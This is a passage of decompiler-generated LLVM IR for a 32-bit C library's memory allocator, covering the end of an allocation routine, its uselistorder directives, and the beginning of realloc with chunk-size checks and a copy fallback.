  %v2_8050858 = add i32 %v1_8050858, %v0_805083e
  store i32 %v5_8050855, i32* @global_var_805eb4c.196, align 4
  %v1_8050864 = load i32, i32* @global_var_805eb54.192, align 4
  %tmp90 = icmp ule i32 %v2_8050858, %v1_8050864
  %v5_805086a = select i1 %tmp90, i32 %v1_8050864, i32 %v2_8050858
  store i32 %v5_805086a, i32* %eax.global-to-local, align 4
  store i32 %v5_805086a, i32* @global_var_805eb54.192, align 4
  %v1_8050876 = add i32 %v0_805084f, 4
  %v2_8050876 = inttoptr i32 %v1_8050876 to i32*
  %v3_8050876 = load i32, i32* %v2_8050876, align 4
  %v1_8050879 = and i32 %v3_8050876, -4
  store i32 %v1_8050879, i32* @ecx, align 4
  %v10_805087c = icmp ult i32 %v1_8050879, %v1_80504f6
  br i1 %v10_805087c, label %dec_label_pc_80508fc, label %dec_label_pc_8050882

dec_label_pc_8050882:                             ; preds = %dec_label_pc_805083e
  store i32 %v1_805057e, i32* %esi.global-to-local, align 4
  %v2_8050888 = sub i32 %v1_8050879, %v1_805057e
  store i32 %v2_8050888, i32* %ecx.global-to-local, align 4
  %v2_805088a = add i32 %v0_805084f, %v1_805057e
  store i32 %v2_805088a, i32* @edx, align 4
  %v1_805088d = or i32 %v1_805057e, 1
  store i32 %v1_805088d, i32* %eax.global-to-local, align 4
  store i32 %v2_805088a, i32* @global_var_805e80c.179, align 4
  store i32 %v1_805088d, i32* %v2_8050876, align 4
  %v0_8050899.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050899

dec_label_pc_8050899:                             ; preds = %dec_label_pc_8050504, %dec_label_pc_8050882
  %v0_8050899 = phi i32 [ %v5_8050517, %dec_label_pc_8050504 ], [ %v0_8050899.pre, %dec_label_pc_8050882 ]
  %v1_8050899 = or i32 %v0_8050899, 1
  store i32 %v1_8050899, i32* @ecx, align 4
  %v0_805089c = load i32, i32* @ebx, align 4
  %v1_805089c = add i32 %v0_805089c, 8
  store i32 %v1_805089c, i32* %ebx.global-to-local, align 4
  %v1_805089f = load i32, i32* @edx, align 4
  %v2_805089f = add i32 %v1_805089f, 4
  %v3_805089f = inttoptr i32 %v2_805089f to i32*
  store i32 %v1_8050899, i32* %v3_805089f, align 4
  br label %dec_label_pc_8050909

dec_label_pc_80508a4:                             ; preds = %dec_label_pc_80502b6
  %v5_80508aa = sub i32 %v1_8050299, %v1_805057e
  store i32 %v5_80508aa, i32* %eax.global-to-local, align 4
  %v2_80508ae = add i32 %v0_8050364118, %v1_805057e
  store i32 %v2_80508ae, i32* @edx, align 4
  %v1_80508b2 = or i32 %v1_805057e, 1
  store i32 %v2_80508ae, i32* @global_var_805e810.180, align 16
  store i32 %v1_80508b2, i32* %v2_8050293, align 4
  %v0_80508be = load i32, i32* %eax.global-to-local, align 4
  %v1_80508c0 = or i32 %v0_80508be, 1
  store i32 %v1_80508c0, i32* @ecx, align 4
  %v0_80508c3 = load i32, i32* @edx, align 4
  store i32 %v0_80508c3, i32* @global_var_805e81c.197, align 4
  store i32 %v0_80508c3, i32* @global_var_805e820.182, align 32
  %v1_80508cf = add i32 %v0_80508c3, 8
  %v2_80508cf = inttoptr i32 %v1_80508cf to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80508cf, align 4
  %v0_80508d6 = load i32, i32* @edx, align 4
  %v1_80508d6 = add i32 %v0_80508d6, 12
  %v2_80508d6 = inttoptr i32 %v1_80508d6 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_80508d6, align 4
  %v0_80508dd = load i32, i32* @ecx, align 4
  %v1_80508dd = load i32, i32* @edx, align 4
  %v2_80508dd = add i32 %v1_80508dd, 4
  %v3_80508dd = inttoptr i32 %v2_80508dd to i32*
  store i32 %v0_80508dd, i32* %v3_80508dd, align 4
  %v0_80508e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80508e0 = load i32, i32* @edx, align 4
  %v3_80508e0 = add i32 %v1_80508e0, %v0_80508e0
  %v4_80508e0 = inttoptr i32 %v3_80508e0 to i32*
  store i32 %v0_80508e0, i32* %v4_80508e0, align 4
  br label %dec_label_pc_80508ee

dec_label_pc_80508e5:                             ; preds = %dec_label_pc_80502c5
  store i32 %v1_805057e, i32* %ebx.global-to-local, align 4
  %v0_80508e9 = load i32, i32* @ebp, align 4
  %v2_80508e9 = or i32 %v1_805057e, 4
  %v3_80508e9 = add i32 %v0_80508e9, %v2_80508e9
  %v4_80508e9 = inttoptr i32 %v3_80508e9 to i32*
  %v5_80508e9 = load i32, i32* %v4_80508e9, align 4
  %v6_80508e9 = or i32 %v5_80508e9, 1
  store i32 %v6_80508e9, i32* %v4_80508e9, align 4
  br label %dec_label_pc_80508ee

dec_label_pc_80508ee:                             ; preds = %dec_label_pc_80508a4, %dec_label_pc_80508e5
  %v0_80508ee = load i32, i32* @ebp, align 4
  %v1_80508ee = add i32 %v0_80508ee, 8
  store i32 %v1_80508ee, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050909

dec_label_pc_80508f3:                             ; preds = %dec_label_pc_80503b5
  %v1_80508f3 = load i32, i32* @ebx, align 4
  %v2_80508f3 = add i32 %v0_80503c1, 4
  %v3_80508f3 = add i32 %v2_80508f3, %v1_80508f3
  %v4_80508f3 = inttoptr i32 %v3_80508f3 to i32*
  %v5_80508f3 = load i32, i32* %v4_80508f3, align 4
  %v6_80508f3 = or i32 %v5_80508f3, 1
  store i32 %v6_80508f3, i32* %v4_80508f3, align 4
  br label %dec_label_pc_80508f8

dec_label_pc_80508f8:                             ; preds = %dec_label_pc_80503cd, %dec_label_pc_80508f3
  %v0_80508f8 = load i32, i32* @ecx, align 4
  store i32 %v0_80508f8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050909

dec_label_pc_80508fc:                             ; preds = %dec_label_pc_805069f, %dec_label_pc_805083e, %dec_label_pc_80506e1, %dec_label_pc_80506b7
  %v0_80508fc = load i32, i32* %stack_var_-92, align 4
  %v1_80508fc = call i32 @__errno_location(i32 %v0_80508fc)
  store i32 %v1_80508fc, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050903 = inttoptr i32 %v1_80508fc to i32*
  store i32 12, i32* %v1_8050903, align 4
  br label %dec_label_pc_8050909

dec_label_pc_8050909:                             ; preds = %dec_label_pc_80508f8, %dec_label_pc_80508ee, %dec_label_pc_8050899, %dec_label_pc_805052f, %dec_label_pc_80504e1, %dec_label_pc_8050260, %dec_label_pc_80508fc
  store i32 %v2_8050197, i32* @eax, align 4
  store i32 %v2_8050197, i32* %stack_var_-92, align 4
  %v2_8050912 = call i32 @__pthread_return_void(i32 %v2_8050197, i32 1)
  store i32 %v2_8050912, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805091a

dec_label_pc_805091a:                             ; preds = %dec_label_pc_80501b5, %dec_label_pc_8050909
  %v0_805091d = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805091d, i32* %eax.global-to-local, align 4
  %v2_805091f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805091f, i32* @ebx, align 4
  store i32 %v0_8050184, i32* @esi, align 4
  store i32 %v0_8050183, i32* @edi, align 4
  store i32 %v0_8050182, i32* @ebp, align 4
  ret i32 %v0_805091d

; uselistorder directives
  uselistorder i32 %v0_80508e0, { 1, 0 }
  uselistorder i32 %v1_8050864, { 1, 0 }
  uselistorder i32 %v2_8050858, { 1, 0 }
  uselistorder i32 %v0_8050843, { 1, 0 }
  uselistorder i32 %v0_805083e, { 0, 2, 1 }
  uselistorder i32 %v1_80507d5, { 1, 0, 2 }
  uselistorder i32 %v0_80507d5, { 1, 0 }
  uselistorder i32 %v2_80507c3, { 1, 0 }
  uselistorder i32 %v1_805077a, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8050768, { 1, 0, 2 }
  uselistorder i32 %v2_8050758, { 1, 2, 0 }
  uselistorder i32 %v2_8050753, { 1, 0, 2 }
  uselistorder i32 %v1_8050743, { 2, 1, 0 }
  uselistorder i8 %v0_8050711, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80506f4, { 1, 0, 2 }
  uselistorder i32 %v0_80507b6, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_80507a8, { 2, 0, 1 }
  uselistorder i32 %v8_80506c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_80506aa, { 1, 0, 2 }
  uselistorder i32 %v3_80506aa, { 1, 0 }
  uselistorder i32 %v1_8050678, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805066c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050668, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8050656, { 1, 0 }
  uselistorder i32 %v1_8050646, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8050636, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_805061f, { 1, 0 }
  uselistorder i32 %v2_8050613, { 1, 0 }
  uselistorder i32 %v2_8050603, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80505e7, { 1, 2, 0 }
  uselistorder i32 %v1_80505e7, { 1, 0, 2 }
  uselistorder i32 %v1_80505e6, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_80505e0, { 1, 0 }
  uselistorder i32 %v2_80505be, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80505b2, { 2, 1, 0 }
  uselistorder i32 %v8_805059d, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8050584, { 1, 0, 2 }
  uselistorder i32 %v0_8050527, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80504f6, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80504e9, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80504cf, { 1, 0, 2 }
  uselistorder i32 %v1_8050469, { 1, 0 }
  uselistorder i32 %v3_805045e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8050458, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805045512, { 1, 0 }
  uselistorder i32 %v2_805044a, { 1, 0 }
  uselistorder i32 %v1_805042e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805042a, { 2, 1, 0 }
  uselistorder i32 %v1_8050426, { 1, 0 }
  uselistorder i32 %v1_8050421, { 2, 1, 0 }
  uselistorder i32 %v2_8050410, { 1, 0 }
  uselistorder i32 %v1_805040d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_80503ab, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_80503f6, { 1, 0 }
  uselistorder i32 %v0_80503c1, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050397, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050364, { 0, 2, 1 }
  uselistorder i32 %v2_8050348, { 1, 0 }
  uselistorder i32 %v1_805033e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8050339.lcssa, { 1, 0 }
  uselistorder i32 %v3_8050329, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8050320, { 1, 0, 2 }
  uselistorder i32 %v3_8050303, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_80502fc, { 1, 0, 2 }
  uselistorder i32 %v2_80502e4, { 2, 1, 0 }
  uselistorder i32 %v0_80502d0, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8050296, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8050364118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050364109, { 1, 0, 2 }
  uselistorder i32 %v3_8050243, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050235, { 2, 1, 0 }
  uselistorder i32 %v2_8050210, { 2, 1, 0 }
  uselistorder i8 %v0_80501de, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805057e, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_80501c7, { 1, 2, 0 }
  uselistorder i32 %v0_80501b0, { 1, 0 }
  uselistorder i32 %v2_8050197, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 1, 12, 13, 15, 16, 17, 18, 0, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_805eb40.194, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134604820, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_805e820.182, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805e80c.179 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805e80c.179 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805091a, { 1, 0 }
  uselistorder label %dec_label_pc_8050909, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80508fc, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80508f8, { 1, 0 }
  uselistorder label %dec_label_pc_80508ee, { 1, 0 }
  uselistorder label %dec_label_pc_8050899, { 1, 0 }
  uselistorder label %dec_label_pc_805083e, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80507d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80507cb, { 1, 0 }
  uselistorder label %dec_label_pc_80507af, { 1, 0 }
  uselistorder label %dec_label_pc_8050758, { 1, 0 }
  uselistorder label %dec_label_pc_8050741, { 1, 0 }
  uselistorder label %dec_label_pc_805072a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80506e1, { 1, 0 }
  uselistorder label %dec_label_pc_805069f, { 1, 0 }
  uselistorder label %dec_label_pc_8050636, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80505d5, { 1, 0 }
  uselistorder label %dec_label_pc_80504e9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80504e1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050455, { 1, 0 }
  uselistorder label %dec_label_pc_805045a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805042e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80503b5, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_805033c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050325, { 1, 0 }
  uselistorder label %dec_label_pc_8050293, { 1, 0 }
  uselistorder label %dec_label_pc_8050364.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050260, { 1, 0 }
  uselistorder label %dec_label_pc_80501de, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050926 = load i32, i32* @esi, align 4
  %v0_8050927 = load i32, i32* @ebx, align 4
  %v4_805092b = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_8050934 = icmp eq i1 %v4_805092b, false
  br i1 %v1_8050934, label %dec_label_pc_8050946, label %dec_label_pc_8050936

dec_label_pc_8050936:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_805093a = call i32 @malloc(i32 %arg2)
  store i32 %v1_805093a, i32* %eax.global-to-local, align 4
  store i32 %v1_805093a, i32* @ebx, align 4
  br label %dec_label_pc_8050c4d

dec_label_pc_8050946:                             ; preds = %entry
  %v1_8050946 = icmp eq i32 %arg2, 0
  %v1_8050948 = icmp eq i1 %v1_8050946, false
  br i1 %v1_8050948, label %dec_label_pc_805095b, label %dec_label_pc_805094a

dec_label_pc_805094a:                             ; preds = %dec_label_pc_8050946
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050951 = call i32 @free(i32 %tmp8)
  store i32 %v1_8050951, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4d

dec_label_pc_805095b:                             ; preds = %dec_label_pc_8050946
  %v2_8050966 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050966, i32* @eax, align 4
  store i32 %v2_8050966, i32* %stack_var_-60, align 4
  %v2_805096b = call i32 @__pthread_return_void(i32 %v2_8050966, i32 134552147)
  store i32 %v2_805096b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058370.177 to i32), i32* %stack_var_-60, align 4
  %v1_8050977 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.177 to i32))
  store i32 %v1_8050977, i32* %eax.global-to-local, align 4
  %v0_805097f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805097f, -32
  br i1 %tmp, label %dec_label_pc_8050996, label %dec_label_pc_8050984

dec_label_pc_8050984:                             ; preds = %dec_label_pc_805095b
  %v0_8050984 = load i32, i32* %stack_var_-60, align 4
  %v1_8050984 = call i32 @__errno_location(i32 %v0_8050984)
  store i32 %v1_8050984, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805098b = inttoptr i32 %v1_8050984 to i32*
  store i32 12, i32* %v1_805098b, align 4
  br label %dec_label_pc_8050c50

dec_label_pc_8050996:                             ; preds = %dec_label_pc_805095b
  %v1_8050996 = add i32 %v0_805097f, 11
  %tmp22 = icmp ult i32 %v1_8050996, 16
  br i1 %tmp22, label %dec_label_pc_80509ad, label %dec_label_pc_80509a6

dec_label_pc_80509a6:                             ; preds = %dec_label_pc_8050996
  %v1_80509a6 = and i32 %v1_8050996, -8
  br label %dec_label_pc_80509ad

dec_label_pc_80509ad:                             ; preds = %dec_label_pc_8050996, %dec_label_pc_80509a6
  %stack_var_-40.0 = phi i32 [ %v1_80509a6, %dec_label_pc_80509a6 ], [ 16, %dec_label_pc_8050996 ]
  %storemerge21 = phi i32 [ %v1_80509a6, %dec_label_pc_80509a6 ], [ %v1_8050996, %dec_label_pc_8050996 ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_80509b1 = add i32 %tmp8, -8
  store i32 %v1_80509b1, i32* @edi, align 4
  %v1_80509b4 = add i32 %tmp8, -4
  %v2_80509b4 = inttoptr i32 %v1_80509b4 to i32*
  %v3_80509b4 = load i32, i32* %v2_80509b4, align 4
  store i32 %v3_80509b4, i32* @edx, align 4
  %v1_80509b9 = and i32 %v3_80509b4, -4
  store i32 %v1_80509b9, i32* %eax.global-to-local, align 4
  %v2_80509bc = and i32 %v3_80509b4, 2
  %v3_80509bc = icmp eq i32 %v2_80509bc, 0
  %v1_80509c3 = icmp eq i1 %v3_80509bc, false
  br i1 %v1_80509c3, label %dec_label_pc_8050b5d, label %dec_label_pc_80509c9

dec_label_pc_80509c9:                             ; preds = %dec_label_pc_80509ad
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80509b9, i32* @ebx, align 4
  %v7_80509cf = icmp ult i32 %v1_80509b9, %stack_var_-40.0
  %v1_80509d1 = icmp eq i1 %v7_80509cf, false
  br i1 %v1_80509d1, label %dec_label_pc_8050b08, label %dec_label_pc_80509d7

dec_label_pc_80509d7:                             ; preds = %dec_label_pc_80509c9
  %v2_80509d7 = add i32 %v1_80509b9, %v1_80509b1
  store i32 %v2_80509d7, i32* @esi, align 4
  %v1_80509da = load i32, i32* @global_var_805e80c.179, align 4
  %v12_80509da = icmp eq i32 %v2_80509d7, %v1_80509da
  %v1_80509e0 = icmp eq i1 %v12_80509da, false
  %v1_8050a1a = add i32 %v2_80509d7, 4
  %v2_8050a1a = inttoptr i32 %v1_8050a1a to i32*
  %v3_8050a1a = load i32, i32* %v2_8050a1a, align 4
  br i1 %v1_80509e0, label %dec_label_pc_8050a1a, label %dec_label_pc_80509e2

dec_label_pc_80509e2:                             ; preds = %dec_label_pc_80509d7
  %v1_80509e7 = and i32 %v3_8050a1a, -4
  %v2_80509ea = add i32 %v1_80509e7, %v1_80509b9
  store i32 %v2_80509ea, i32* %ecx.global-to-local, align 4
  %v1_80509f0 = add i32 %stack_var_-40.0, 16
  store i32 %v1_80509f0, i32* %eax.global-to-local, align 4
  %v7_80509f3 = icmp ult i32 %v2_80509ea, %v1_80509f0
  br i1 %v7_80509f3, label %dec_label_pc_8050a58, label %dec_label_pc_80509f7

dec_label_pc_80509f7:                             ; preds = %dec_label_pc_80509e2
  %v1_80509f7 = urem i32 %v3_80509b4, 2
  %v5_80509fa = or i32 %v1_80509f7, %stack_var_-40.0
  store i32 %v5_80509fa, i32* @edx, align 4
  store i32 %v5_80509fa, i32* %v2_80509b4, align 4
  %v0_8050a05 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050a05 = sub i32 %v0_8050a05, %stack_var_-40.0
  %v0_8050a07 = load i32, i32* @edi, align 4
  %v2_8050a07 = add i32 %v0_8050a07, %stack_var_-40.0
  store i32 %v2_8050a07, i32* %eax.global-to-local, align 4
  %v1_8050a0a = or i32 %v2_8050a05, 1
  store i32 %v1_8050a0a, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050a07, i32* @global_var_805e80c.179, align 4
  %v2_8050a12 = add i32 %v2_8050a07, 4
  %v3_8050a12 = inttoptr i32 %v2_8050a12 to i32*
  store i32 %v1_8050a0a, i32* %v3_8050a12, align 4
  br label %dec_label_pc_8050c3b

dec_label_pc_8050a1a:                             ; preds = %dec_label_pc_80509d7
  %v1_8050a1f = and i32 %v3_8050a1a, -2
  store i32 %v1_8050a1f, i32* %eax.global-to-local, align 4
  %v3_8050a22 = add i32 %v1_8050a1a, %v1_8050a1f
  %v4_8050a22 = inttoptr i32 %v3_8050a22 to i8*
  %v5_8050a22 = load i8, i8* %v4_8050a22, align 1
  %v6_8050a22 = urem i8 %v5_8050a22, 2
  %v7_8050a22 = icmp eq i8 %v6_8050a22, 0
  %v1_8050a27 = icmp eq i1 %v7_8050a22, false
  br i1 %v1_8050a27, label %dec_label_pc_8050a58, label %dec_label_pc_8050a29

dec_label_pc_8050a29:                             ; preds = %dec_label_pc_8050a1a
  %v1_8050a2d = and i32 %v3_8050a1a, -4
  %v2_8050a30 = add i32 %v1_8050a2d, %v1_80509b9
  store i32 %v2_8050a30, i32* @ebx, align 4
  %v10_8050a32 = icmp ult i32 %v2_8050a30, %stack_var_-40.0
  br i1 %v10_8050a32, label %dec_label_pc_8050a58, label %dec_label_pc_8050a38

dec_label_pc_8050a38:                             ; preds = %dec_label_pc_8050a29
  %v1_8050a38 = add i32 %v1_80509b9, %tmp8
  %v2_8050a38 = inttoptr i32 %v1_8050a38 to i32*
  %v3_8050a38 = load i32, i32* %v2_8050a38, align 4
  store i32 %v3_8050a38, i32* @edx, align 4
  %v1_8050a3b = add i32 %v2_80509d7, 12
  %v2_8050a3b = inttoptr i32 %v1_8050a3b to i32*
  %v3_8050a3b = load i32, i32* %v2_8050a3b, align 4
  store i32 %v3_8050a3b, i32* %eax.global-to-local, align 4
  %v1_8050a3e = add i32 %v3_8050a38, 12
  %v2_8050a3e = inttoptr i32 %v1_8050a3e to i32*
  %v3_8050a3e = load i32, i32* %v2_8050a3e, align 4
  %v15_8050a3e = icmp eq i32 %v3_8050a3e, %v2_80509d7
  %v1_8050a41 = icmp eq i1 %v15_8050a3e, false
  br i1 %v1_8050a41, label %dec_label_pc_8050a48, label %dec_label_pc_8050a43

dec_label_pc_8050a43:                             ; preds = %dec_label_pc_8050a38
  %v1_8050a43 = add i32 %v3_8050a3b, 8
  %v2_8050a43 = inttoptr i32 %v1_8050a43 to i32*
  %v3_8050a43 = load i32, i32* %v2_8050a43, align 4
  %v15_8050a43 = icmp eq i32 %v3_8050a43, %v2_80509d7
  br i1 %v15_8050a43, label %dec_label_pc_8050a4d, label %dec_label_pc_8050a48

dec_label_pc_8050a48:                             ; preds = %dec_label_pc_8050a43, %dec_label_pc_8050a38
  %v0_8050a48 = call i32 @abort()
  store i32 %v0_8050a48, i32* %eax.global-to-local, align 4
  %v1_8050a4d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050a4d

dec_label_pc_8050a4d:                             ; preds = %dec_label_pc_8050a43, %dec_label_pc_8050a48
  %v1_8050a4d = phi i32 [ %v3_8050a38, %dec_label_pc_8050a43 ], [ %v1_8050a4d.pre, %dec_label_pc_8050a48 ]
  %v0_8050a4d = phi i32 [ %v3_8050a3b, %dec_label_pc_8050a43 ], [ %v0_8050a48, %dec_label_pc_8050a48 ]
  %v2_8050a4d = add i32 %v1_8050a4d, 12
  %v3_8050a4d = inttoptr i32 %v2_8050a4d to i32*
  store i32 %v0_8050a4d, i32* %v3_8050a4d, align 4
  %v0_8050a50 = load i32, i32* @edx, align 4
  %v1_8050a50 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a50 = add i32 %v1_8050a50, 8
  %v3_8050a50 = inttoptr i32 %v2_8050a50 to i32*
  store i32 %v0_8050a50, i32* %v3_8050a50, align 4
  %v0_8050b08.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050b08

dec_label_pc_8050a58:                             ; preds = %dec_label_pc_8050a29, %dec_label_pc_8050a1a, %dec_label_pc_80509e2
  %v1_8050a5f = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050a5f, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a5f, i32* %stack_var_-60, align 4
  %v1_8050a63 = call i32 @malloc(i32 %v1_8050a5f)
  store i32 %v1_8050a63, i32* %eax.global-to-local, align 4
  %v1_8050a6b = icmp eq i32 %v1_8050a63, 0
  store i32 %v1_8050a63, i32* @edx, align 4
  br i1 %v1_8050a6b, label %dec_label_pc_8050c37, label %dec_label_pc_8050a75

dec_label_pc_8050a75:                             ; preds = %dec_label_pc_8050a58
  %v1_8050a75 = add i32 %v1_8050a63, -8
  store i32 %v1_8050a75, i32* %ebx.global-to-local, align 4
  %v1_8050a78 = load i32, i32* @esi, align 4
  %v12_8050a78 = icmp eq i32 %v1_8050a75, %v1_8050a78
  %v1_8050a7a = add i32 %v1_8050a63, -4
  %v2_8050a7a = inttoptr i32 %v1_8050a7a to i32*
  %v3_8050a7a = load i32, i32* %v2_8050a7a, align 4
  store i32 %v3_8050a7a, i32* %eax.global-to-local, align 4
  %v1_8050a7d = icmp eq i1 %v12_8050a78, false
  br i1 %v1_8050a7d, label %dec_label_pc_8050a8b, label %dec_label_pc_8050a7f

dec_label_pc_8050a7f:                             ; preds = %dec_label_pc_8050a75
  store i32 %v1_80509b9, i32* @edx, align 4
  %v1_8050a83 = and i32 %v3_8050a7a, -4
  store i32 %v1_8050a83, i32* %eax.global-to-local, align 4
  %v2_8050a86 = add i32 %v1_8050a83, %v1_80509b9
  store i32 %v2_8050a86, i32* @ebx, align 4
  br label %dec_label_pc_8050b08

dec_label_pc_8050a8b:                             ; preds = %dec_label_pc_8050a75
  %v1_8050a8f = add i32 %v1_80509b9, -4
  store i32 %v1_8050a8f, i32* %eax.global-to-local, align 4
  %v2_8050a94 = udiv i32 %v1_8050a8f, 4
  store i32 %v2_8050a94, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_8050a8f, 37
  br i1 %tmp23, label %dec_label_pc_8050aad, label %dec_label_pc_8050a9c

dec_label_pc_8050a9c:                             ; preds = %dec_label_pc_8050a8b
  store i32 %v1_8050a63, i32* %stack_var_-60, align 4
  %v3_8050aa3 = inttoptr i32 %v1_8050a63 to i16*
  %v4_8050aa3 = call i32 @memcpy(i16* %v3_8050aa3, i32 %tmp8, i32 %v1_8050a8f)
  store i32 %v4_8050aa3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050af4

dec_label_pc_8050aad:                             ; preds = %dec_label_pc_8050a8b
  store i32 %tmp8, i32* @esi, align 4
  %v2_8050ab4 = load i32, i32* %arg1, align 4
  store i32 %v2_8050ab4, i32* %eax.global-to-local, align 4
  %v2_8050ab6 = inttoptr i32 %v1_8050a63 to i32*
  store i32 %v2_8050ab4, i32* %v2_8050ab6, align 4
  %v0_8050ab8 = load i32, i32* @esi, align 4
  %v1_8050ab8 = add i32 %v0_8050ab8, 4
  %v2_8050ab8 = inttoptr i32 %v1_8050ab8 to i32*
  %v3_8050ab8 = load i32, i32* %v2_8050ab8, align 4
